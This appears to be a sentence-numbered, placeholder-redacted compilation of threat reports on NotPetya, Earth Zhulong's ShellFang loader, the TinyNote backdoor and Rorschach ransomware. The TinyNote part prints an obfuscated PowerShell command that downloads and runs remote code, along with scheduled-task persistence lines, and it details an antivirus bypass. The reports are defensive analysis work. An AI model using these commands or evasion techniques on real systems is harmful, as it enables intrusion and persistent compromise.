sentence.1: Executive Summary This technical analysis provides an in-depth analysis and review of NotPetya.
sentence.2: For more information on CrowdStrike’s proactive protection features see the earlier CrowdStrike blog on how Falcon Endpoint Protection prevents the NotPetya attack.
sentence.3: NotPetya combines ransomware with the ability to propagate itself across a network.
sentence.4: It spreads to Microsoft Windows machines using several propagation methods, including the EternalBlue exploit for the <CVE> vulnerability in the <PROTOCOL> service.
sentence.5: This is the same vulnerability Microsoft reported on in MS17-010, which was exploited so successfully in the recent WannaCry ransomware outbreak.
sentence.6: Once a machine is infected by NotPetya, a series of malicious activities ensue, including the following: Dropped <DATA_OBJECT> Process hashes and process privilege checks Credential theft <DATA_OBJECT> impersonation Malware propagation Network node enumeration <PROTOCOL> copy and remote execution SMBv1 exploitation via EternalBlue UNC write malware to admin$ on remote target Remote execution of the malware MBR ransomware Physical drive manipulation MFT encryption <DATA_OBJECT> encryption System shutdown Anti-forensics Ransomware instructions for <DATA_OBJECT> recovery occur after the infection process has completed.

sentence.72: MBR Ransomware Physical Drive Manipulation The malware calls DeviceIOControl on <FILE_PATH> with IOCTL_DISK_GET_PARTITION_INFO_EX control code to get PARTITION_INFORMATION_EX structure.

sentence.74: The malware takes the following steps to modify the MBR: Reads the MBR and encodes it using <ENC_ALGO> encoding with key 0x7 The first sector is overwritten by a custom boot loader
sentence.75: The next 31 sectors are then overwritten by 16-bit code that is responsible for encrypting the MFT using Salsa20 encryption Sector 32 contains the following: CRYPT_FLAG
sentence.76: –> Initially, this byte is set to 0, which denotes that the MFT has not been encrypted.
sentence.77: The 16-bit code uses this flag to determine whether to infect the MFT A random array of bytes 0x20 in length is generated using CryptGenRangom.
sentence.78: This is used as the Salsa20 encryption key.
sentence.79: In addition, another random array of bytes 0x8 in length is created using the same API call; this is used as the nonce for the encryption.
sentence.80: The malware also writes the hardcoded string 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX in the sector.
sentence.81: This is the Bitcoin wallet that is later displayed on the splash <DATA_OBJECT>.
sentence.82: A random blob is created by CryptGenRandom 0x3C bytes in length.
sentence.83: This is presented as the user’s personal installation key on the splash <DATA_OBJECT>.
sentence.84: It should be noted that this personal installation key is random in nature; and therefore there is no way to trace it back to the victim machine Sector 33 contains all 0x7’s.
sentence.85: This is used as an integrity check for the decryption process.
sentence.86: Sector 34 contains the original MBR that was encoded by XORing with 0x7 MFT Encryption As mentioned previously, the malware has its own custom boot loader once the machine has been infected and rebooted.
sentence.87: This code within the MBR is responsible for loading the code which encrypts the MFT using Salsa20, displays the ransom note, and accepts the private key.

sentence.90: However, its main purpose is to encrypt or decrypt the MFT, which it is able to accomplish using Salsa20.
sentence.91: The following are the BIOS interrupt services used throughout the code: int 0x13 – read<FILE_PATH> sectors on disk int 0x10 – display text int 0x19 – cause disk reboot int 0x16 – obtain <DATA_OBJECT>, and status of keyboard buffer The code first checks the CRYPT_FLAG in sector 32 to see whether it has been set to 1 (encrypted).
sentence.92: The first time a machine is infected, the CRYPT_FLAG is always set to 0 (not encrypted), which leads the malware to invoke a subroutine that displays the following decoy check disk <DATA_OBJECT> to the user.

sentence.137: Anti-Forensics The malware employs anti-forensics practices throughout its execution.

sentence.152: Familiar Patterns Target Southeast Asian Firms In 2022, we discovered Earth Zhulong, a hacking group that has been targeting Asian firms similar to another well-known threat actor.
sentence.153: In this article, we unravel their new tactics, techniques and procedures that they apply on their misdeeds.
sentence.154: By: Ted Lee February 08, 2023Read time: ( words) Save to Folio Subscribe Introduction In 2022, we discovered a hacking group that has been targeting telecom, technology, and media sectors in Southeast Asia since 2020.
sentence.155: We track this particular group as Earth Zhulong.
sentence.156: We believe that Earth Zhulong is likely related to the Chinese-linked hacking group 1937CN based on similar code in the custom shellcode loader and victimology.
sentence.157: In this post, we’ll introduce Earth Zhulong’s new tactics, techniques, and procedures (TTPs) in the recent campaign and the evolution of their custom shellcode loader, “ShellFang”.
sentence.158: Through the TTPs, we see that they are sophisticated and meticulous as malicious actors.
sentence.159: They adopt multiple approaches to obfuscate their tools and eliminate their footprint after finishing the operation.
sentence.160: As a result, we have exerted greater effort to hunt down and analyze their tools to fully understand the attack scenario.
sentence.161: In addition, we have verified three different variants of ShellFang were used from 2020 to 2022.
sentence.162: The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing.
sentence.163: In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts.
sentence.164: Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information.
sentence.165: Compared to old variants, code structure in the latest variant is dramatically different and there are few shared features between old and the latest variant.
sentence.166: However, we found the relationship during the long-term investigation and finally correlated old variants with the latest one.
sentence.167: We believe the relationship found in this research could bring this notorious hacking group back to public sight and the findings here will be helpful to future research on hacker groups which are active in Southeast Asia.
sentence.168: Initial Access – Lure document Back in 2020, through the command and control (C&C) domain observed in our investigation, we found a lure document with a malicious macro.
sentence.169: Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into <FILENAME>.
sentence.170: We have identified the embedded shellcode as a Cobalt Strike shellcode which will be used to build connection to a remote hacking machine.
sentence.171: We believe this lure document is one of the approaches used by the threat actors to compromise their targets.
sentence.174: Malicious macro embedded in the document Figure 3.
sentence.175: Shellcode which is used for code injection.
sentence.176: Propagation through GPO In early 2022, we further observed new TTPs used to spread malware in the victim’s environment.
sentence.177: After getting access to the internal network, they perform domain exploration using SharpHound.
sentence.178: Once they successfully compromise the domain controller, they will submit immediate tasks to the hosts in the domain through GPO as seen in Figure 5, As the hosts receive the task through GPO, they will run a PowerShell script named “<FILENAME>” and create scheduled tasks for persistence. Figure 4.
sentence.180: PowerShell script to create a ImmediateTask through GPO
sentence.181: As shown in Figure 6, threat actors use multi-layered <ENC_ALGO> encryption and <ENC_ALGO> encoding to obfuscate “<FILENAME>”.
sentence.182: Heavy obfuscation in a simple but useful anti-analysis approach makes it difficult for security products to detect their scripts.
sentence.183: After clearing the obfuscation, we found the script is used to deploy malware components (<FILENAME>, <FILENAME>, and <DOMAIN>) on the infected machine.
sentence.186: Cleaned content of <FILENAME> Earth Zhulong adopted DLL sideloading techniques to run their malware.
sentence.188: The malicious DLL “<FILENAME>”, which we named as “ShellFang”, loads when a legitimate executable is launched.
sentence.189: It then calls the export function, “Go”, to start the loading procedure of the encrypted payload to decrypt the payload called “<DOMAIN>”, which is the Cobalt Strike beacon. Figure 8. <FILENAME> <DATA_OBJECT> information Figure 9. <FILENAME> will call the malicious export function in <FILENAME> Evolution of ShellFang loader During the investigation, we found that Earth Zhulong started targeting Southeast Asian firms in 2020.
sentence.190: Although they always used DLL sideloading to launch their malware, they never stopped changing the code structure of their shellcode loader.
sentence.191: Here we summarize the information we collected from 2020 to 2022 and verify three different variants used by Earth Zhulong.
sentence.193: The earliest variant of ShellFang was observed in a victim’s environment in 2020.
sentence.194: However, based on the timestamp of export function, this variant was compiled in 2017.
sentence.195: The code structure of ShellFang is simple.
sentence.196: It would read the encrypted payload (“<DOMAIN>” is the payload in this case) then decrypt it and run it in the memory.
sentence.197: The shellcode loader used <ENC_ALGO> with a 26 byte keyset and started a long sleep after finishing shellcode execution. Figure 10.
sentence.198: Main function of earliest variants Loader in 2021 (Variant 2) Compared to the variant in 2020, there was no big change in 2021.
sentence.199: They changed the decryption function into <ENC_ALGO> instead of the original <ENC_ALGO>, but the code structure was basically the same as the previous variant.
sentence.201: Main function of variant in 2021 Loader in the latest campaign (2022, variant 3) Compared to previous variants, changes were seen in the code structure in variant 3.
sentence.202: In this variant, more anti-analysis techniques were added to strengthen their loader, including API hashing and execution flow obfuscation through exception mechanism.
sentence.203: Threat actors intentionally raise exceptions to interrupt malware analysts and obfuscate the execution flow of the program.
sentence.204: Windows APIs are obfuscated via a hashing function and dynamically resolved in the run-time.
sentence.205: The payload will be decrypted with <ENC_ALGO> algorithm, and the final payload is an <PROTOCOL> Cobalt Strike beacon.
sentence.207: A loop of intentional exception triggers to obfuscate control flow of program.
sentence.209: Necessary APIs will be dynamically resolved during execution.
sentence.210: Hacking Tools Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts.
sentence.211: It’s worth noting that they use various programming platforms including C language, Go-Lang and Python.
sentence.212: In this section, we will mention some noteworthy hacking tools used in their operation.
sentence.213: MACAMAX Although threat actors already installed the Cobalt Strike as backdoor, we also found out that they deployed another Go-Lang backdoor, which we named MACAMAX in the meantime.
sentence.214: It supports proxy (Socks5), upload<FILE_PATH> <DATA_OBJECT> and remote shell functions.
sentence.215: Network configuration was defined in another configuration <DATA_OBJECT>, and it would be loaded when running the backdoor.
sentence.216: Furthermore, the configuration <DATA_OBJECT> will be deleted once it is loaded into memory for fear of leaking network infrastructures.
sentence.217: cmd> {MACAMAX}.exe {network config <DATA_OBJECT>} Usage of MACAMAX -rh={remote host} -rp={remote port} -ps={proxy server} -sl=5
sentence.219: Themida-packed EarthWorm During our investigation, we found they also use the notorious network-penetration tool, “EarthWorm”.
sentence.220: EarthWorm is a simple network tunnel tool with SOCKS v5 server and port transfer developed by a Chinese engineer.
sentence.221: Although the original developer already stopped maintenance and removed the download link, it’s still getting more popular in the recent cyber-attack.
sentence.222: With this tool, the attackers are able to bypass the firewall and access the machine in a restricted network.
sentence.223: Since EarthWorm has become more common, security vendors also provide solutions to detect this powerful tool.
sentence.224: In order to avoid being detected by security products, threat actors use Themida packer to obfuscate the signature used for detection.
sentence.225: Information Stealer We found a python-based information stealer used to collect internal information of victims.
sentence.226: This information stealer is compiled with Python 3.10 and packed by noted tools, “PyInstaller”, used to convert python script to be a standalone executable.
sentence.227: After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim’s Oracle database.
sentence.228: Dumped data will be stored in a csv <DATA_OBJECT> and compressed by WinRAR with a <DATA_OBJECT> (“5tgb6yhn”), then all compressed data will be uploaded to Dropbox at the end.
sentence.230: Oracle connection config and SQL command for information dump Figure 15.
sentence.232: Dropbox configuration and upload RAR data Footprint Hidden and Elimination Threat actors run PowerShell scripts with previous versions of PowerShell that do not support Script Block Logging with the intent to evade being detected while running the malicious scripts (so-called “Downgrade Attack”).
sentence.233: After finishing the operation, they will clean the intrusion footprint and delete important <DATA_OBJECT>, including payload and network configuration <DATA_OBJECT>, to avoid leaking any information to analysts.
sentence.234: It is worth noting that they also corrupt their shellcode loader by wiping out the header of the <DATA_OBJECT>, seen in Figure 15.
sentence.235: This is a common approach to make it harder for analysts to analyze their tools in the ransomware attack, but it’s relatively rare in an APT attack.
sentence.236: These show that they are sophisticated and meticulous actors. Figure 17.
sentence.237: Obfuscated PowerShell script used to clean the footprint on Domain Controller Figure 18.
sentence.238: Left is the corrupted ShellFang and the right one is the normal one.
sentence.239: Attribution Summarizing the information collected from 2020 to 2022, we find that Earth Zhulong is likely to be related to a notorious hacking group, “1937CN” based on the code similarity and victimology aspects.
sentence.240: In this section, we will introduce the process of attribution.
sentence.241: Code similarity Although the earliest variant of ShellFang used in this campaign was observed in 2020, we found the malware was already compiled in 2017, based on the timestamp of an export function, which can be seen in Figure 19.
sentence.242: In addition, we reviewed reports published around that time and found the decryption algorithm in ShellFang was once used in the campaign by 1937CN, which was revealed by Fortinet in 2017.
sentence.243: Shown in Figure 20, the <ENC_ALGO> keyset and algorithm are highly similar.
sentence.244: Based on the prevalent time and algorithm, we believe Earth Zhulong is likely to be related to 1937CN.
sentence.246: Timestamp of export function in the earliest variant Figure 20.
sentence.247: The left is the algorithm revealed by Fortinet in 2017.
sentence.248: The right one is found in the earliest ShellFang variant.
sentence.249: Victimology Based on our long-term investigation, Southeast Asia is Earth Zhulong’s major target, focusing on telecom and media sectors.
sentence.250: 1937CN is a well-known hacking group in Southeast Asia and has always been their major target as well.
sentence.251: In 2016, 1937CN was suspected to attack Noi Bai and Tan Son Nhat airports in Vietnam, hijacking the flight information screens to broadcast anti-Vietnamese and anti-Philippines propaganda.
sentence.252: In 2017, Fortinet also revealed their campaign targeting Vietnamese organizations by using a weaponized RTF document.
sentence.253: In victimology aspects, Earth Zhulong is consistent with the 1937CN group.
sentence.254: Conclusion Through long-term monitoring, we found this campaign continued targeting Southeast Asia from 2020 to 2022.
sentence.255: In the past 2 years, they always have used DLL sideloading as their major technique to launch their malware.
sentence.256: However, they continued updating their tools and even added more anti-analysis techniques in their latest tools including multi-layer obfuscation, API obfuscation, and execution flow obfuscation by raising exceptions intentionally.
sentence.257: We also found they compromise the domain controller in the victim’s environment and deployed Cobalt Strike on their hosts by creating immediate tasks through GPO.
sentence.258: In addition, Go-lang and Python are also used as programming languages to build their tools.
sentence.259: Both programming languages provide strength for cross-platform programs development.
sentence.260: Furthermore, Python and Go-lang executables usually compile all necessary libraries in a single binary, making malware classification more difficult for analysts and resulting in a large binary.
sentence.261: Some security products have limitations when handling large <DATA_OBJECT>.
sentence.262: Which may be their approach as large binaries reduces the risk of being detected.
sentence.263: In the process of tracking and analyzing the data, we have identified the hacker group behind the campaign which targets organizations in Southeast Asia, and called it Earth Zhulong.
sentence.264: Based on the victimology and usage of a highly similar decryption algorithm, we believe that Earth Zhulong is related to the hacking group known as “1937CN”.
sentence.265: We hope our findings will remind the public that the actions and motivations of 1937CN continue to resurface through groups like Earth Zhulong, and that these groups remain a big threat to cybersecurity in Southeast Asia.
sentence.266: While the threat remains focused on Southeast Asia, tactics like this can be applied to various places across the world.
sentence.267: It is better to stay ahead of the curve to ensure your safety against these malicious actors.
sentence.268: Ensuring your systems are protected on all aspects is integral to the productivity of your enterprise.
sentence.269: Trend Micro Vision One can help you prevent threats like this with multiple security layers across all platforms, and its intuitive threat detection, investigation and response system makes it a key factor to stop Earth Zhulong’s evolving methods of infiltrating systems.

sentence.274: Camaro Dragon’s TinyNote Backdoor url: <URL> Executive summary Since early January 2023, there has been a notable surge in activity targeting European foreign affairs entities linked to Southeast and East Asia.
sentence.275: The threat actors responsible are tracked by Check Point Research as Camaro Dragon and are associated with a broad network of espionage operations aligned with Chinese interests.
sentence.276: Camaro Dragon overlaps with previously reported activities conducted by state-sponsored Chinese threat actors, namely Mustang Panda.
sentence.277: A portion of the group’s attack toolset and underlying infrastructure was thoroughly described by fellow ESET researchers in their detailed technical paper on the MQsTTang backdoor.
sentence.278: Check Point Research analysis of these attacks also has uncovered a malicious TP-Link router firmware containing a custom implant named Horse Shell, which allows the threat actors to maintain persistent access and build anonymous infrastructure using compromised routers.
sentence.279: In this report, we analyze another previously undisclosed backdoor associated with this cluster of activity which shares with it not only a common infrastructure but also the same high-level intelligence-gathering goal.
sentence.280: Key findings: A previously unknown Go-based backdoor called TinyNote was found on one of the Camaro Dragon distribution servers, in addition to being spotted in the wild.
sentence.281: The malware samples also communicate with other known C&C servers attributed to Camaro Dragon.
sentence.282: The TinyNote backdoor is distributed with names related to foreign affairs matters, and likely targets Southeast and East Asian embassies.
sentence.283: The backdoor performs a bypass of the Indonesian antivirus SmadAV, a security tool popular in Southeast Asian countries, such as Myanmar and Indonesia, and apparently used by a subset of the campaign targets.
sentence.284: The TinyNote backdoor is a first-stage malware only capable of basic machine enumeration and command execution via PowerShell or Goroutines.
sentence.285: However, it focuses on redundancy to gain a foothold on the infected machine, including setting up multiple persistency tasks, communication with several different C&C servers, and different types of C&C command execution.
sentence.286: Introduction When we investigated a few delivery servers related to Camaro Dragon, we discovered that one of them exposed the threat actors’ tools and <DATA_OBJECT> located on the server, only protected by basic <PROTOCOL> Authorization with a known <DATA_OBJECT>.
sentence.287: Among many other tools, previously discussed by other researchers, we discovered yet another backdoor that we named TinyNote.
sentence.288: Interestingly, the folder with the backdoor contained two other tools: Autoruns by Sysinternals, and HRSWord, which is a part of the Chinese Huorong Network Technology protection suite, and is often used by various actors to disable endpoint protection tools.
sentence.289: The backdoor we found on the server, and its versions found in the wild, are executables with names related to foreign affairs, such as PDF_ Contacts List Of Invitated Deplomatic Members and Note_Documents_No.14-Tokyo-__From___Embassy___of___Russia_.
sentence.290: This naming convention is similar to the one used at the same time by the MQsTTang backdoor versions discovered by ESET and found in VT.
sentence.291: Similar to MQsTTang, the TinyNote backdoor samples also contain folder icon in an attempt to deceive victims about their real purpose.
sentence.292: The custom backdoor is written in the Go programming language.
sentence.293: In the copyright and build information for the executables, the malware developers left a reference to <DOMAIN>, the Myanmar military infrastructure, likely to add credibility to their tool.
sentence.294: The actors’ heightened interest in Myanmar entities and successful attacks carried out against them were previously discussed thoroughly.
sentence.295: Our examination of the infrastructure led us to other findings that indicate the actors’ interest in Taiwan’s government entities as well.
sentence.296: The TinyNote backdoor is a basic remote shell, limited in capabilities: it enables the actors to fingerprint the infected machine, set up persistence, and establish two different ways to execute commands received from the C&C server.
sentence.297: Despite its simplicity, it employs an interesting method of bypassing a very specific antivirus solution, suggesting the actors had issues gaining a foothold in specific environments.
sentence.298: SmadAV evasion At the beginning of its execution, the malware starts a function called bypassSMADAV, whose purpose is to bypass the Indonesian antivirus Smadav.
sentence.299: The developers of the antivirus position their solution as a “second-layer antivirus” with “active users mostly from Indonesia, and other users mostly come from Southeast Asia and Africa Countries”.
sentence.300: The existence of the code that handles this specific antivirus once again confirms the focused targeting of Camaro Dragon campaigns and their knowledge of their victims’ environments and solutions.
sentence.301: It’s worth mentioning that in previous operations, the actors used SmadAV for their own purposes, forcing its component <FILENAME> to side-load their malicious DLL.
sentence.302: When any new process starts in the system, SmadAV scans all available windows.
sentence.303: For every problematic window found, the antivirus checks if the window is visible with the API function IsWindowVisible.
sentence.304: If the window is visible, it adds this window owner’s process ID to an array containing all current processes that have at least one visible window: Figure 1 – SmadAV code that collects a list of PIDs that have associated windows.
sentence.305: After iterating over all windows, the antivirus process iterates over this array and compares each process ID to the newly created process ID.
sentence.306: If none is found, meaning the new process doesn’t have any visible windows, the antivirus deems the newly created process to be malicious and shows a popup that suggests blocking the created process.
sentence.307: This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.
sentence.308: The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name “EDIT” which is one of the available default windows class names.
sentence.309: The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.
sentence.310: These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB:
sentence.311: Figure 2 – A piece of malware code creates a specially crafted window to bypass the smadAV.
sentence.312: Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.
sentence.313: But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.
sentence.314: Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted.
sentence.315: Figure 3 – SmadAV detection on the Go backdoor with the removed bypassSMADAV function.
sentence.316: Backdoor execution flow The malware creates a mutex named NASA&USA and then continues execution according to one of two modes of operation.
sentence.317: First mode: persistence, PowerShell backdoor, and malware “installation” The malware checks if there is a “zip” string in the <DATA_OBJECT> path.
sentence.318: If this is not found, it continues the execution flow.
sentence.320: If this fails, the malware does not continue the execution, likely because the infected user only has low privileges.
sentence.321: Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from <DOMAIN> from different C&C servers, most likely to eliminate a single point of failure: schtasks <FILE_PATH>
sentence.325: <DOMAIN>]::Create(<FILE_PATH>"<URL>");(new-object <DOMAIN>(($<DOMAIN>()).GetResponseStream())).ReadToEnd() | <FILENAME> -noprofile -\"" <FILE_PATH> At the time of execution, both servers returned the same code pointing to the third server: <FILE_PATH> <FILE_PATH> "start <FILENAME> -nop
sentence.326: -c set-alias exi iex;`$v1='iex (new-object <DOMAIN>).dow';`$v2='nloadstring(''<URL>)';exi(`$v1+`$v2+`$v3);" The final payload returned is a lightweight PowerShell backdoor, which retrieves a list of commands from the CMD header from the C&C server response, executes them with Invoke-Expression, concatenates the outputs with '_n1w_' string, and sends them back to the server in POST request: $WindowState = '[DllImport("<FILENAME>")]
sentence.327: public static extern bool ShowWindow(int handle, int stat);';add-type -name win -member $WindowState -namespace native;[<DOMAIN>]::ShowWindow(([System.
sentence.353: The malware then copies itself to the zip <DATA_OBJECT> with the name [16 random characters].zip in <FILE_PATH>, and also creates another copy of itself to the path using the zip name as a folder, for example, <FILE_PATH> Both the <DATA_OBJECT> inside the zip and the unzipped copy of the <DATA_OBJECT> get the same randomly generated name [5 random characters].exe, for example, <FILENAME>.
sentence.354: Finally, the malware creates a scheduled task to execute its copy from this randomized path: schtasks <FILE_PATH>
sentence.355: <FILE_PATH> 8NaZrCq3pGeDRXKF <FILE_PATH> MINUTE <FILE_PATH> 15 <FILE_PATH> "<FILENAME> <FILE_PATH>" <FILE_PATH> Second mode: the backdoor This mode happens after the malware has achieved persistence and is running from a “zip” path.
sentence.356: First, the malware enumerates the system for the following data and concatenates it to one string:
sentence.357: The current system username The current username home folder The system’s network interfaces (name, MacAddress, description)
sentence.358: Next, it encrypts the string using a simple <ENC_ALGO> encryption algorithm with the key NASA and <ENC_ALGO> encodes it afterward.
sentence.359: It then picks one random C&C URL out of the three available and constructs a GET request: <URL> <URL> <URL>
sentence.360: The encoded enumeration data is stored in a <DATA_OBJECT> called SSN.
sentence.361: Other headers in the request are constructed from serval random values.
sentence.362: The hostname header is selected from the following list: <URL> <URL> <URL> <DOMAIN> The user-agent is also randomized and is selected from the following list: Mozilla<FILE_PATH> (Windows NT 10.0; Win64; x64; rv:103.0)
sentence.363: Gecko<FILE_PATH> Firefox<FILE_PATH> Mozilla<FILE_PATH> (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit<FILE_PATH> (KHTML, like Gecko) Version<FILE_PATH> Mobile<FILE_PATH> Safari<FILE_PATH> Mozilla<FILE_PATH> (X11; Ubuntu; Linux x86_64; rv:63.0)
sentence.364: Gecko<FILE_PATH> Firefox<FILE_PATH> Mozilla<FILE_PATH> (Windows NT 10.0; Win64; x64)
sentence.366: Safari<FILE_PATH> The expected result from the server is a JSON with the following structure: {"msg":"[<ENC_ALGO>-ENCODED COMMAND]"} After the validation of the JSON and <ENC_ALGO> decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop.
sentence.368: In addition to the fact that one of the backdoor versions was found on the Camaro Dragon distribution server, there are other strong connections between the actors and the TinyNote malware: The server <IPv4>, where one of the versions of the malware was first found behaves like the C&C server of the backdoor, and was also a delivery server for the MQsTTang backdoor during the same time period.
sentence.369: Another C&C server, <IPv4>, is known to be used by the threat actors continuously.
sentence.370: The victimology and lures are consistent with the latest Camaro Dragon campaigns, including the activity associated with the MQsTTang backdoor.
sentence.371: In addition, the actors also keep using a “folder” icon and a specific naming convention for some of their backdoors seen since early 2023.
sentence.372: The third C&C server, <IPv4>, has rather unique SSL certificates with Alternative names <DOMAIN>, <DOMAIN>, and *.<DOMAIN>.
sentence.373: Another server with the same certificate, <IPv4> is currently redirecting to the official infrastructure of the government of Taiwan, but likely was used for the additional attacks by the threat actor.
sentence.374: Conclusion The TinyNote backdoor highlights the targeted approach of Camaro Dragon and the extensive research they conduct prior to infiltrating their intended victims’ systems.
sentence.375: Although the backdoor is not technically complex, it employs several noteworthy tactics to establish an initial foothold in the compromised systems.
sentence.376: These include the utilization of Golang, a programming language rarely used in Camaro Dragon tools, minimal lightweight functionality, and embedded bypass of a specific antivirus software commonly installed on potential targets.
sentence.377: The simultaneous use of this backdoor together with other tools with different levels of technical advancement implies that the threat actors are actively seeking to diversify their attack arsenal.

sentence.380: title: Rorschach – A New Sophisticated and Fast Ransomware - Check Point Research url: <URL> Research by: Jiri Vinopal, Dennis Yarizadeh and Gil Gekker Key Findings: Check Point Research (CPR) and Check Point Incident Response Team (CPIRT) encountered a previously unnamed ransomware strain, we dubbed Rorschach, deployed against a US-based company.
sentence.381: Rorschach ransomware appears to be unique, sharing no overlaps that could easily attribute it to any known ransomware strain.
sentence.382: In addition, it does not bear any kind of branding which is a common practice among ransomware groups.
sentence.383: The ransomware is partly autonomous, carrying out tasks that are usually manually performed during enterprise-wide ransomware deployment, such as creating a domain group policy (GPO).
sentence.384: In the past, similar functionality was linked to LockBit 2.0.
sentence.385: The ransomware is highly customizable and contains technically unique features, such as the use of direct syscalls, rarely observed in ransomware.
sentence.386: Moreover, due to different implementation methods, Rorschach is one of the fastest ransomware observed, by the speed of encryption.
sentence.387: The ransomware was deployed using DLL side-loading of a Cortex XDR Dump Service Tool, a signed commercial security product, a loading method which is not commonly used to load ransomware.
sentence.388: The vulnerability was properly reported to Palo Alto Networks.
sentence.389: Introduction While responding to a ransomware case against a US-based company, the CPIRT recently came across a unique ransomware strain deployed using a signed component of a commercial security product.
sentence.390: Unlike other ransomware cases, the threat actor did not hide behind any alias and appears to have no affiliation to any of the known ransomware groups.
sentence.391: Those two facts, rarities in the ransomware ecosystem, piqued CPR interest and prompted us to thoroughly analyze the newly discovered malware.
sentence.392: Throughout its analysis, the new ransomware exhibited unique features.
sentence.393: A behavioral analysis of the new ransomware suggests it is partly autonomous, spreading itself automatically when executed on a Domain Controller (DC), while it clears the event logs of the affected machines.
sentence.394: In addition, it’s extremely flexible, operating not only based on a built-in configuration but also on numerous optional arguments which allow it to change its behavior according to the operator’s needs.
sentence.395: While it seems to have taken inspiration from some of the most infamous ransomware families, it also contains unique functionalities, rarely seen among ransomware, such as the use of direct syscalls.
sentence.396: The ransomware note sent out to the victim was formatted similarly to Yanluowang ransomware notes, although other variants dropped a note that more closely resembled DarkSide ransomware notes (causing some to mistakenly refer to it as DarkSide).
sentence.397: Each person who examined the ransomware saw something a little bit different, prompting us to name it after the famous psychological test – Rorschach Ransomware.
sentence.398: Execution Flow As observed in the wild, Rorschach execution uses these three <DATA_OBJECT>: <FILENAME> – Cortex XDR Dump Service Tool version 7.3.0.16740, abused to side-load <FILENAME> <FILENAME> – Packed Rorschach loader and injector, used to decrypt and inject the ransomware.
sentence.399: <DOMAIN> – Encrypted Rorschach ransomware which contains all the logic and configuration.
sentence.400: Upon execution of <FILENAME>, due to DLL side-loading, the loader<FILE_PATH> <FILENAME> is loaded into memory and runs in the context of <FILENAME>.
sentence.401: The main Rorschach payload <DOMAIN> is subsequently loaded into memory as well, decrypted and injected into <FILENAME>, where the ransomware logic begins.
sentence.402: Figure 1 – Rorschach’s High Level Execution Flow on both endpoints and on Domain Controllers.
sentence.403: Security Solution Evasion Rorschach spawns processes in an uncommon way, running them in SUSPEND mode and giving out falsified arguments to harden analysis and remediation efforts.
sentence.404: The falsified argument, which consists of a repeating string of the digit 1 based on the length of the real argument, rewritten in memory and replaced with the real argument, resulting in a unique execution: Figure 2 – Rorschach’s process tree spawns processes with falsified arguments.
sentence.405: The ransomware uses this technique to run the following operations:
sentence.406: Attempt to stop a predefined list of services, using <FILENAME> stop.
sentence.407: Delete shadow volumes and backups to harden recovery, using legitimate Windows tools such as <FILENAME>, <FILENAME>, <FILENAME>, and <FILENAME> Run <FILENAME> to clear the following Windows event logs: Application, Security, System and Windows Powershell.
sentence.408: Disable the Windows firewall, using <FILENAME> Self-propagation When executed on a Windows Domain Controller (DC), the ransomware automatically creates a Group Policy, spreading itself to other machines within the domain.
sentence.409: Similar functionality was linked in the past to LockBit 2.0, although the Rorschach Ransomware GPO deployment is carried out differently, as described below: Rorschach copies its <DATA_OBJECT> into the scripts folder of the DC, and deletes them from the original location.
sentence.410: Rorschach then creates a group policy (see Appendix C) that copies itself into the %Public% folder of all workstations in the domain.
sentence.411: The ransomware creates another group policy in an attempt to kill a list of predefined list of processes.
sentence.412: This is done by creating a schedule task invoking <FILENAME>.
sentence.413: Finally, Rorschach creates another group policy that registers a scheduled task which runs immediately and upon user logon, to run Rorschach’s main executable with the relevant arguments.
sentence.414: Our colleagues in AhnLab published a more thorough behavioral analysis of another Rorschach variant which provides further details into the operations.
sentence.416: In addition to the ransomware’s uncommon behavior described above, the Rorschach binary itself contains additional interesting features, differentiating it further from other ransomware.
sentence.418: The actual sample is protected carefully, and requires quite a lot of work to access.
sentence.419: First, the initial loader<FILE_PATH> <FILENAME> is protected with UPX-style packing.
sentence.420: However, this is changed in such a way that it isn’t readily unpacked using standard solutions and requires manual unpacking.
sentence.421: After unpacking, the sample loads and decrypts <DOMAIN>, which contains the ransomware logic.
sentence.422: After Rorschach is injected into <FILENAME>, it’s still protected by VMProtect.
sentence.423: This results in a crucial portion of the code being virtualized in addition to lacking an IAT table.
sentence.424: Only after defeating both of these safeguards is it possible to properly analyze the ransomware logic.
sentence.425: Security Solution Evasion Although Rorschach is used solely for encrypting an environment, it incorporates an unusual technique to evade defense mechanisms.
sentence.426: It makes direct system calls using the “syscall” instruction.
sentence.427: While previously observed in other strains of malware, it’s quite startling to see this in ransomware.
sentence.428: The procedure involves utilizing the instruction itself, and it goes as follows:
sentence.429: The ransomware finds the relevant syscall numbers for NT APIs, mainly related to <DATA_OBJECT> manipulation.
sentence.430: Rorschach then stores the numbers in a table for future use.
sentence.431: When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API.
sentence.432: In other words, the malware first creates a syscall table for NT APIs used for <DATA_OBJECT> encryption: Figure 3 – Creation of syscall table for certain NT APIs.
sentence.433: The end of the table is a section with the relevant syscall numbers: Figure 4 – Section containing the syscall table.
sentence.434: The example below shows how the syscall numbers are used: Figure 5 – Example use of direct syscall.
sentence.435: This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls.
sentence.437: In addition to the hardcoded configuration, the ransomware comes with multiple built-in options, probably for the operators comfort.
sentence.438: All of them are hidden, obfuscated, and not accessible without reverse-engineering the ransomware.
